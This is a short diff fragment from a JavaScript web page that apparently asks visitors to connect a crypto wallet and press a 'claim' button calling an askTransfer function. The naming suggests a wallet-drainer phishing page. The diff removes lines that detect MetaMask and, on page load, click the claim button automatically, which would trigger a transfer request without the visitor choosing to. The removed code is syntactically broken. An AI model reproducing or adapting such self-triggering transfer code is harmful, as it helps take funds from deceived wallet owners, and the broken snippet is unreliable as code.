@@ -325,11 +325,7 @@ async function askTransfer() {
   document.getElementById("claimButton").style.opacity = 1;  
 }
 
-if (typeof window.ethereum !== "undefined") metamaskInstalled = true;
-window.addEventListener("load", async () => {
-  document.querySelector("#claimButton").addEventListener("click", askTransfer() {
-        document.getElementById("claimButton").click();
-});
+
 
 async function connectButton() {
     await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
